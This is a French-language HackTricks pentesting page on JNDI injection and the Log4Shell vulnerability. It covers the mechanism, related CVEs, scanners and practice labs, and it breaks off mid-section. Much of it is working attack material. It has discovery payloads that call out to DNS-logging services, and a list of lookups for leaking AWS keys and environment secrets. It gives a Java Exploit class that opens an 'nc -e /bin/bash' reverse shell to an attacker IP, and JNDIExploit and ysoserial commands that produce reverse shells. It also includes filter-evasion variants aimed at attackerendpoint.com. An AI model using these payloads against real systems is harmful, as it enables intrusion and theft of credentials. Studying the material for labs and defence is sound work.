# JNDI - Java Naming and Directory Interface & Log4Shell

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
{% endhint %}

## Informations de base

JNDI, int√©gr√© dans Java depuis la fin des ann√©es 1990, sert de service d'annuaire, permettant aux programmes Java de localiser des donn√©es ou des objets via un syst√®me de nommage. Il prend en charge divers services d'annuaire via des interfaces de fournisseur de services (SPI), permettant la r√©cup√©ration de donn√©es √† partir de diff√©rents syst√®mes, y compris des objets Java distants. Les SPI courants incluent CORBA COS, Java RMI Registry et LDAP.

### R√©f√©rence de nommage JNDI

Les objets Java peuvent √™tre stock√©s et r√©cup√©r√©s √† l'aide de R√©f√©rences de nommage JNDI, qui se pr√©sentent sous deux formes :

* **Adresses de r√©f√©rence** : Sp√©cifie l'emplacement d'un objet (par exemple, _rmi://server/ref_), permettant une r√©cup√©ration directe √† partir de l'adresse sp√©cifi√©e.
* **Usine distante** : Fait r√©f√©rence √† une classe d'usine distante. Lorsqu'elle est acc√©d√©e, la classe est t√©l√©charg√©e et instanci√©e √† partir de l'emplacement distant.

Cependant, ce m√©canisme peut √™tre exploit√©, ce qui peut entra√Æner le chargement et l'ex√©cution de code arbitraire. En tant que contre-mesure :

* **RMI** : `java.rmi.server.useCodeabseOnly = true` par d√©faut depuis JDK 7u21, restreignant le chargement d'objets distants. Un Gestionnaire de s√©curit√© limite √©galement ce qui peut √™tre charg√©.
* **LDAP** : `com.sun.jndi.ldap.object.trustURLCodebase = false` par d√©faut depuis JDK 6u141, 7u131, 8u121, bloquant l'ex√©cution d'objets Java charg√©s √† distance. S'il est d√©fini sur `true`, l'ex√©cution de code √† distance est possible sans la supervision d'un Gestionnaire de s√©curit√©.
* **CORBA** : N'a pas de propri√©t√© sp√©cifique, mais le Gestionnaire de s√©curit√© est toujours actif.

Cependant, le **Gestionnaire de nommage**, responsable de la r√©solution des liens JNDI, manque de m√©canismes de s√©curit√© int√©gr√©s, permettant potentiellement la r√©cup√©ration d'objets de n'importe quelle source. Cela pose un risque car les protections RMI, LDAP et CORBA peuvent √™tre contourn√©es, entra√Ænant le chargement d'objets Java arbitraires ou l'exploitation de composants d'application existants (gadgets) pour ex√©cuter du code malveillant.

Des exemples d'URL exploitables incluent :

* _rmi://attacker-server/bar_
* _ldap://attacker-server/bar_
* _iiop://attacker-server/bar_

Malgr√© les protections, des vuln√©rabilit√©s subsistent, principalement en raison du manque de protections contre le chargement de JNDI √† partir de sources non fiables et de la possibilit√© de contourner les protections existantes.

### Exemple JNDI

![](<../../.gitbook/assets/image (1022).png>)

M√™me si vous avez d√©fini un **`PROVIDER_URL`**, vous pouvez indiquer un autre dans une recherche et il sera accessible : `ctx.lookup("<attacker-controlled-url>")` et c'est ce qu'un attaquant abusera pour charger des objets arbitraires √† partir d'un syst√®me qu'il contr√¥le.

### Aper√ßu de CORBA

CORBA (Common Object Request Broker Architecture) utilise une **R√©f√©rence d'objet interop√©rable (IOR)** pour identifier de mani√®re unique les objets distants. Cette r√©f√©rence comprend des informations essentielles telles que :

* **Type ID** : Identifiant unique pour une interface.
* **Codebase** : URL pour obtenir la classe stub.

Notamment, CORBA n'est pas intrins√®quement vuln√©rable. Assurer la s√©curit√© implique g√©n√©ralement :

* Installation d'un **Gestionnaire de s√©curit√©**.
* Configurer le Gestionnaire de s√©curit√© pour permettre les connexions √† des codebases potentiellement malveillantes. Cela peut √™tre r√©alis√© par :
* Permission de socket, par exemple, `permissions java.net.SocketPermission "*:1098-1099", "connect";`.
* Permissions de lecture de fichiers, soit universellement (`permission java.io.FilePermission "<<ALL FILES>>", "read";`) ou pour des r√©pertoires sp√©cifiques o√π des fichiers malveillants pourraient √™tre plac√©s.

Cependant, certaines politiques de fournisseurs peuvent √™tre indulgentes et permettre ces connexions par d√©faut.

### Contexte RMI

Pour RMI (Remote Method Invocation), la situation est quelque peu diff√©rente. Comme avec CORBA, le t√©l√©chargement de classes arbitraires est restreint par d√©faut. Pour exploiter RMI, il faudrait g√©n√©ralement contourner le Gestionnaire de s√©curit√©, un exploit √©galement pertinent dans CORBA.

### LDAP

Tout d'abord, nous devons distinguer entre une recherche et une recherche de nom.\
Une **recherche** utilisera une URL comme `ldap://localhost:389/o=JNDITutorial` pour trouver l'objet JNDITutorial √† partir d'un serveur LDAP et **r√©cup√©rer ses attributs**.\
Une **recherche de nom** est destin√©e aux **services de nommage** car nous voulons obtenir **tout ce qui est li√© √† un nom**.

Si la recherche LDAP a √©t√© invoqu√©e avec **SearchControls.setReturningObjFlag() avec `true`, alors l'objet retourn√© sera reconstruit**.

Par cons√©quent, il existe plusieurs fa√ßons d'attaquer ces options.\
Un **attaquant peut empoisonner les enregistrements LDAP en introduisant des charges utiles** sur eux qui seront ex√©cut√©es dans les syst√®mes qui les collectent (tr√®s utile pour **compromettre des dizaines de machines** si vous avez acc√®s au serveur LDAP). Une autre fa√ßon d'exploiter cela serait de r√©aliser une **attaque MitM dans une recherche LDAP**, par exemple.

Dans le cas o√π vous pouvez **faire r√©soudre une URL JNDI LDAP par une application**, vous pouvez contr√¥ler le LDAP qui sera recherch√©, et vous pourriez renvoyer l'exploit (log4shell).

#### Exploit de d√©s√©rialisation

![](<../../.gitbook/assets/image (275).png>)

L'**exploit est s√©rialis√©** et sera d√©s√©rialis√©.\
Dans le cas o√π `trustURLCodebase` est `true`, un attaquant peut fournir ses propres classes dans la codebase sinon, il devra abuser des gadgets dans le classpath.

#### Exploit de r√©f√©rence JNDI

Il est plus facile d'attaquer ce LDAP en utilisant des **r√©f√©rences JavaFactory** :

![](<../../.gitbook/assets/image (1059).png>)

## Vuln√©rabilit√© Log4Shell

La vuln√©rabilit√© est introduite dans Log4j car il prend en charge une [**syntaxe sp√©ciale**](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution) sous la forme `${prefix:name}` o√π `prefix` est l'un d'un certain nombre de [**Lookups**](https://logging.apache.org/log4j/2.x/manual/lookups.html) o√π `name` doit √™tre √©valu√©. Par exemple, `${java:version}` est la version actuelle de Java en cours d'ex√©cution.

[**LOG4J2-313**](https://issues.apache.org/jira/browse/LOG4J2-313) a introduit une fonctionnalit√© de recherche `jndi`. Cette fonctionnalit√© permet la r√©cup√©ration de variables via JNDI. En g√©n√©ral, la cl√© est automatiquement pr√©fix√©e par `java:comp/env/`. Cependant, si la cl√© elle-m√™me inclut un **":"**, ce pr√©fixe par d√©faut n'est pas appliqu√©.

Avec un **: pr√©sent** dans la cl√©, comme dans `${jndi:ldap://example.com/a}`, il n'y a **pas de pr√©fixe** et le **serveur LDAP est interrog√© pour l'objet**. Et ces Lookups peuvent √™tre utilis√©s √† la fois dans la configuration de Log4j ainsi que lorsque des lignes sont enregistr√©es.

Par cons√©quent, la seule chose n√©cessaire pour obtenir RCE est une **version vuln√©rable de Log4j traitant des informations contr√¥l√©es par l'utilisateur**. Et parce que c'est une biblioth√®que largement utilis√©e par les applications Java pour enregistrer des informations (y compris les applications expos√©es √† Internet), il √©tait tr√®s courant d'avoir log4j enregistrant par exemple les en-t√™tes HTTP re√ßus comme le User-Agent. Cependant, log4j n'est **pas utilis√© uniquement pour enregistrer des informations HTTP mais toute entr√©e** et donn√©es que le d√©veloppeur a indiqu√©es.

## Aper√ßu des CVE li√©s √† Log4Shell

### [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) **\[Critique]**

Cette vuln√©rabilit√© est un **d√©faut de d√©s√©rialisation non fiable** critique dans le composant `log4j-core`, affectant les versions de 2.0-beta9 √† 2.14.1. Elle permet l'**ex√©cution de code √† distance (RCE)**, permettant aux attaquants de prendre le contr√¥le des syst√®mes. Le probl√®me a √©t√© signal√© par Chen Zhaojun de l'√©quipe de s√©curit√© d'Alibaba Cloud et affecte divers frameworks Apache. Le correctif initial dans la version 2.15.0 √©tait incomplet. Des r√®gles Sigma pour la d√©fense sont disponibles ([R√®gle 1](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j\_fields.yml), [R√®gle 2](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j.yml)).

### [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) **\[Critique]**

Initialement √©valu√© comme faible mais ensuite reclass√© comme critique, ce CVE est un d√©faut de **D√©ni de Service (DoS)** r√©sultant d'un correctif incomplet dans 2.15.0 pour CVE-2021-44228. Il affecte les configurations non par d√©faut, permettant aux attaquants de provoquer des attaques DoS via des charges utiles con√ßues. Un [tweet](https://twitter.com/marcioalm/status/1471740771581652995) montre une m√©thode de contournement. Le probl√®me est r√©solu dans les versions 2.16.0 et 2.12.2 en supprimant les mod√®les de recherche de message et en d√©sactivant JNDI par d√©faut.

### [CVE-2021-4104](https://nvd.nist.gov/vuln/detail/CVE-2021-4104) **\[√âlev√©]**

Affectant les **versions Log4j 1.x** dans des configurations non par d√©faut utilisant `JMSAppender`, ce CVE est un d√©faut de d√©s√©rialisation non fiable. Aucun correctif n'est disponible pour la branche 1.x, qui est en fin de vie, et il est recommand√© de passer √† `log4j-core 2.17.0`.

### [CVE-2021-42550](https://nvd.nist.gov/vuln/detail/CVE-2021-42550) **\[Mod√©r√©]**

Cette vuln√©rabilit√© affecte le **framework de journalisation Logback**, un successeur de Log4j 1.x. Pr√©c√©demment consid√©r√© comme s√ªr, le framework a √©t√© trouv√© vuln√©rable, et de nouvelles versions (1.3.0-alpha11 et 1.2.9) ont √©t√© publi√©es pour r√©soudre le probl√®me.

### **CVE-2021-45105** **\[√âlev√©]**

Log4j 2.16.0 contient un d√©faut DoS, ce qui a conduit √† la publication de `log4j 2.17.0` pour corriger le CVE. Plus de d√©tails sont disponibles dans le [rapport de BleepingComputer](https://www.bleepingcomputer.com/news/security/upgraded-to-log4j-216-surprise-theres-a-217-fixing-dos/).

### [CVE-2021-44832](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/)

Affectant la version log4j 2.17, ce CVE n√©cessite que l'attaquant contr√¥le le fichier de configuration de log4j. Il implique une ex√©cution potentielle de code arbitraire via un JDBCAppender configur√©. Plus de d√©tails sont disponibles dans le [post de blog Checkmarx](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/).

## Exploitation de Log4Shell

### D√©couverte

Cette vuln√©rabilit√© est tr√®s facile √† d√©couvrir si elle n'est pas prot√©g√©e car elle enverra au moins une **demande DNS** √† l'adresse que vous indiquez dans votre charge utile. Par cons√©quent, des charges utiles comme :

* `${jndi:ldap://x${hostName}.L4J.lt4aev8pktxcq2qlpdr5qu5ya.canarytokens.com/a}` (utilisant [canarytokens.com](https://canarytokens.org/generate))
* `${jndi:ldap://c72gqsaum5n94mgp67m0c8no4hoyyyyyn.interact.sh}` (utilisant [interactsh](https://github.com/projectdiscovery/interactsh))
* `${jndi:ldap://abpb84w6lqp66p0ylo715m5osfy5mu.burpcollaborator.net}` (utilisant Burp Suite)
* `${jndi:ldap://2j4ayo.dnslog.cn}` (utilisant [dnslog](http://dnslog.cn))
* `${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/fe47f5ee-efd7-42ee-9897-22d18976c520}` (utilisant [huntress](https://log4shell.huntress.com))

Notez que **m√™me si une demande DNS est re√ßue, cela ne signifie pas que l'application est exploitable** (ou m√™me vuln√©rable), vous devrez essayer de l'exploiter.

{% hint style="info" %}
N'oubliez pas que pour **exploiter la version 2.15**, vous devez ajouter le **contournement de v√©rification localhost** : ${jndi:ldap://**127.0.0.1#**...}
{% endhint %}

#### **D√©couverte locale**

Recherchez des **versions vuln√©rables locales** de la biblioth√®que avec :
```bash
find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```
### **V√©rification**

Certaines des plateformes mentionn√©es pr√©c√©demment vous permettront d'ins√©rer des donn√©es variables qui seront enregistr√©es lorsqu'elles sont demand√©es.\
Cela peut √™tre tr√®s utile pour 2 choses :

* Pour **v√©rifier** la vuln√©rabilit√©
* Pour **exfiltrer des informations** en abusant de la vuln√©rabilit√©

Par exemple, vous pourriez demander quelque chose comme :\
ou comme `${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`** et si une **demande DNS est re√ßue avec la valeur de la variable d'environnement**, vous savez que l'application est vuln√©rable.

D'autres informations que vous pourriez essayer de **leaker** :
```
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
```
### RCE Information

{% hint style="info" %}
Les h√¥tes fonctionnant sur des versions JDK sup√©rieures √† 6u141, 7u131 ou 8u121 sont prot√©g√©s contre le vecteur d'attaque de chargement de classe LDAP. Cela est d√ª √† la d√©sactivation par d√©faut de `com.sun.jndi.ldap.object.trustURLCodebase`, qui emp√™che JNDI de charger une base de code distante via LDAP. Cependant, il est crucial de noter que ces versions ne sont **pas prot√©g√©es contre le vecteur d'attaque de d√©s√©rialisation**.

Pour les attaquants cherchant √† exploiter ces versions JDK sup√©rieures, il est n√©cessaire de tirer parti d'un **gadget de confiance** au sein de l'application Java. Des outils comme ysoserial ou JNDIExploit sont souvent utilis√©s √† cette fin. En revanche, exploiter des versions JDK inf√©rieures est relativement plus facile car ces versions peuvent √™tre manipul√©es pour charger et ex√©cuter des classes arbitraires.

Pour **plus d'informations** (_comme les limitations sur les vecteurs RMI et CORBA_) **consultez la section pr√©c√©dente sur la r√©f√©rence de nommage JNDI** ou [https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/)
{% endhint %}

### RCE - Marshalsec avec charge utile personnalis√©e

Vous pouvez tester cela dans la **bo√Æte THM :** [**https://tryhackme.com/room/solar**](https://tryhackme.com/room/solar)

Utilisez l'outil [**marshalsec**](https://github.com/mbechler/marshalsec) (version jar disponible [**ici**](https://github.com/RandomRobbieBF/marshalsec-jar)). Cette approche √©tablit un serveur de r√©f√©rence LDAP pour rediriger les connexions vers un serveur HTTP secondaire o√π l'exploit sera h√©berg√© :
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"
```
Pour inciter la cible √† charger un code de shell invers√©, cr√©ez un fichier Java nomm√© `Exploit.java` avec le contenu ci-dessous :
```java
public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
Compilez le fichier Java en un fichier de classe en utilisant : `javac Exploit.java -source 8 -target 8`. Ensuite, initiez un **serveur HTTP** dans le r√©pertoire contenant le fichier de classe avec : `python3 -m http.server`. Assurez-vous que le **serveur LDAP marshalsec** fait r√©f√©rence √† ce serveur HTTP.

D√©clenchez l'ex√©cution de la classe d'exploitation sur le serveur web vuln√©rable en envoyant une charge utile ressemblant √† :
```bash
${jndi:ldap://<LDAP_IP>:1389/Exploit}
```
**Remarque :** Cette exploitation repose sur la configuration de Java pour permettre le chargement de code √† distance via LDAP. Si cela n'est pas permis, envisagez d'exploiter une classe de confiance pour l'ex√©cution de code arbitraire.

### RCE - **JNDIExploit**

{% hint style="info" %}
Notez que pour une raison quelconque, l'auteur a retir√© ce projet de github apr√®s la d√©couverte de log4shell. Vous pouvez trouver une version mise en cache √† [https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2](https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2) mais si vous souhaitez respecter la d√©cision de l'auteur, utilisez une m√©thode diff√©rente pour exploiter cette vuln√©rabilit√©.

De plus, vous ne pouvez pas trouver le code source dans la machine Wayback, donc soit analysez le code source, soit ex√©cutez le jar en sachant que vous ne savez pas ce que vous ex√©cutez.
{% endhint %}

Pour cet exemple, vous pouvez simplement ex√©cuter ce **serveur web vuln√©rable √† log4shell** sur le port 8080 : [https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app) (_dans le README, vous trouverez comment l'ex√©cuter_). Cette application vuln√©rable enregistre avec une version vuln√©rable de log4shell le contenu de l'en-t√™te de la requ√™te HTTP _X-Api-Version_.

Ensuite, vous pouvez t√©l√©charger le fichier jar **JNDIExploit** et l'ex√©cuter avec :
```bash
wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
```
Apr√®s avoir lu le code pendant quelques minutes, dans _com.feihong.ldap.LdapServer_ et _com.feihong.ldap.HTTPServer_, vous pouvez voir comment les **serveurs LDAP et HTTP sont cr√©√©s**. Le serveur LDAP comprendra quel payload doit √™tre servi et redirigera la victime vers le serveur HTTP, qui servira l'exploit.\
Dans _com.feihong.ldap.gadgets_, vous pouvez trouver **certains gadgets sp√©cifiques** qui peuvent √™tre utilis√©s pour ex√©cuter l'action souhait√©e (potentiellement ex√©cuter du code arbitraire). Et dans _com.feihong.ldap.template_, vous pouvez voir les diff√©rentes classes de mod√®les qui **g√©n√©reront les exploits**.

Vous pouvez voir tous les exploits disponibles avec **`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`**. Certains utiles sont :
```bash
ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
```
Donc, dans notre exemple, nous avons d√©j√† cette application docker vuln√©rable en cours d'ex√©cution. Pour l'attaquer :
```bash
# Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
```
Lorsque vous envoyez les attaques, vous verrez une sortie dans le terminal o√π vous avez ex√©cut√© **JNDIExploit-1.2-SNAPSHOT.jar**.

**N'oubliez pas de v√©rifier `java -jar JNDIExploit-1.2-SNAPSHOT.jar -u` pour d'autres options d'exploitation. De plus, si vous en avez besoin, vous pouvez changer le port des serveurs LDAP et HTTP.**

### RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a>

De mani√®re similaire √† l'exploit pr√©c√©dent, vous pouvez essayer d'utiliser [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) pour exploiter cette vuln√©rabilit√©.\
Vous pouvez g√©n√©rer les URL √† envoyer √† la victime en ex√©cutant :
```bash
# Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
```
_Ce type d'attaque utilisant un objet java g√©n√©r√© sur mesure fonctionnera dans des laboratoires comme la **THM solar room**. Cependant, cela ne fonctionnera g√©n√©ralement pas (car par d√©faut, Java n'est pas configur√© pour charger une base de code distante via LDAP) je pense que ce n'est pas en abusant d'une classe de confiance pour ex√©cuter du code arbitraire._

### RCE - JNDI-Injection-Exploit-Plus

[https://github.com/cckuailong/JNDI-Injection-Exploit-Plus](https://github.com/cckuailong/JNDI-Injection-Exploit-Plus) est un autre outil pour g√©n√©rer des **liens JNDI exploitables** et fournir des services d'arri√®re-plan en d√©marrant un serveur RMI, un serveur LDAP et un serveur HTTP.\

### RCE - ysoserial & JNDI-Exploit-Kit

Cette option est vraiment utile pour attaquer **les versions Java configur√©es pour ne faire confiance qu'√† des classes sp√©cifi√©es et non √† tout le monde**. Par cons√©quent, **ysoserial** sera utilis√© pour g√©n√©rer des **s√©rialisations de classes de confiance** qui peuvent √™tre utilis√©es comme gadgets pour **ex√©cuter du code arbitraire** (_la classe de confiance abus√©e par ysoserial doit √™tre utilis√©e par le programme java de la victime pour que l'exploit fonctionne_).

En utilisant **ysoserial** ou [**ysoserial-modified**](https://github.com/pimps/ysoserial-modified), vous pouvez cr√©er l'exploit de d√©s√©rialisation qui sera t√©l√©charg√© par JNDI :
```bash
# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
```
Utilisez [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) pour g√©n√©rer des **liens JNDI** o√π l'exploit attendra des connexions des machines vuln√©rables. Vous pouvez servir **diff√©rents exploits qui peuvent √™tre g√©n√©r√©s automatiquement** par le JNDI-Exploit-Kit ou m√™me vos **propres charges utiles de d√©s√©rialisation** (g√©n√©r√©es par vous ou ysoserial).
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```
![](<../../.gitbook/assets/image (1118).png>)

Maintenant, vous pouvez facilement utiliser un lien JNDI g√©n√©r√© pour exploiter la vuln√©rabilit√© et obtenir un **reverse shell** en l'envoyant √† une version vuln√©rable de log4j : **`${ldap://10.10.14.10:1389/generated}`**

### Bypasses
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:ƒ±}}:ldap://...} //Notice the unicode "i"
```
### Scanners automatiques

* [https://github.com/fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
* [https://github.com/adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
* [https://github.com/silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell)
* [https://github.com/cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner)
* [https://github.com/Qualys/log4jscanwin](https://github.com/Qualys/log4jscanwin)
* [https://github.com/hillu/local-log4j-vuln-scanner](https://github.com/hillu/local-log4j-vuln-scanner)
* [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
* [https://github.com/palantir/log4j-sniffer](https://github.com/palantir/log4j-sniffer) - Trouver des biblioth√®ques vuln√©rables locales

### Laboratoires √† tester

* [**LogForge HTB machine**](https://app.hackthebox.com/tracks/UHC-track)
* [**Try Hack Me Solar room**](https://tryhackme.com/room/solar)
* [**https://github.com/leonjza/log4jpwn**](https://github.com/leonjza/log4jpwn)
* [**https://github.com/christophetd/log4shell-vulnerable-app**](https://github.com/christophetd/log4shell-vulnerable-app)

## Exploitation post-Log4Shell

Dans ce [**CTF writeup**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/), il est bien expliqu√© comment il est potentiellement **possible** d'**abuser** de certaines fonctionnalit√©s de **Log4J**.

La [**page de s√©curit√©**](https://logging.apache.org/log4j/2.x/security.html) de Log4j contient des phrases int√©ressantes :

> √Ä partir de la version 2.16.0 (pour Java 8), la **fonctionnalit√© de recherche de message a √©t√© compl√®tement supprim√©e**. **Les recherches dans la configuration fonctionnent toujours**. De plus, Log4j d√©sactive d√©sormais l'acc√®s √† JNDI par d√©faut. Les recherches JNDI dans la configuration doivent d√©sormais √™tre activ√©es explicitement.

> √Ä partir de la version 2.17.0 (et 2.12.3 et 2.3.1 pour Java 7 et Java 6), **seules les cha√Ænes de recherche dans la configuration sont √©tendues r√©cursivement** ; dans toute autre utilisation, seule la recherche de premier niveau est r√©solue, et les recherches imbriqu√©es ne sont pas r√©solues.

Cela signifie qu'en r√®gle g√©n√©rale, vous pouvez **oublier d'utiliser un exploit `jndi`**. De plus, pour effectuer des **recherches r√©cursives**, vous devez les configurer.

Par exemple, dans ce CTF, cela a √©t√© configur√© dans le fichier log4j2.xml :
```xml
<Console name="Console" target="SYSTEM_ERR">
<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n">
</PatternLayout>
</Console>
```
### Recherches Env

Dans [ce CTF](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/), l'attaquant contr√¥lait la valeur de `${sys:cmd}` et devait exfiltrer le drapeau d'une variable d'environnement.\
Comme vu sur cette page dans [**les charges utiles pr√©c√©dentes**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification), il existe diff√©rentes mani√®res d'acc√©der aux variables d'environnement, telles que : **`${env:FLAG}`**. Dans ce CTF, cela √©tait inutile mais cela pourrait ne pas l'√™tre dans d'autres sc√©narios r√©els.

### Exfiltration dans les Exceptions

Dans le CTF, vous **ne pouviez pas acc√©der √† stderr** de l'application java utilisant log4J, mais les **exceptions Log4J sont envoy√©es √† stdout**, qui √©taient imprim√©es dans l'application python. Cela signifiait qu'en d√©clenchant une exception, nous pouvions acc√©der au contenu. Une exception pour exfiltrer le drapeau √©tait : **`${java:${env:FLAG}}`**. Cela fonctionne parce que **`${java:CTF{blahblah}}`** n'existe pas et une exception avec la valeur du drapeau sera affich√©e :

![](<../../.gitbook/assets/image (1023).png>)

### Exceptions des Mod√®les de Conversion

Juste pour le mentionner, vous pourriez √©galement injecter de nouveaux [**mod√®les de conversion**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout) et d√©clencher des exceptions qui seront enregistr√©es dans `stdout`. Par exemple :

![](<../../.gitbook/assets/image (683).png>)

Cela n'a pas √©t√© jug√© utile pour exfiltrer des donn√©es √† l'int√©rieur du message d'erreur, car la recherche n'√©tait pas r√©solue avant le mod√®le de conversion, mais cela pourrait √™tre utile pour d'autres choses comme la d√©tection.

### Regex des Mod√®les de Conversion

Cependant, il est possible d'utiliser certains **mod√®les de conversion qui supportent les regex** pour exfiltrer des informations d'une recherche en utilisant des regex et en abusant des **recherches binaires** ou des comportements **bas√©s sur le temps**.

* **Recherche binaire via les messages d'exception**

Le mod√®le de conversion **`%replace`** peut √™tre utilis√© pour **remplacer** **le contenu** d'une **cha√Æne** m√™me en utilisant **des regex**. Cela fonctionne comme suit : `replace{pattern}{regex}{substitution}`\
En abusant de ce comportement, vous pourriez faire en sorte que le remplacement **d√©clenche une exception si la regex correspondait** √† quoi que ce soit √† l'int√©rieur de la cha√Æne (et pas d'exception si elle n'√©tait pas trouv√©e) comme ceci :
```bash
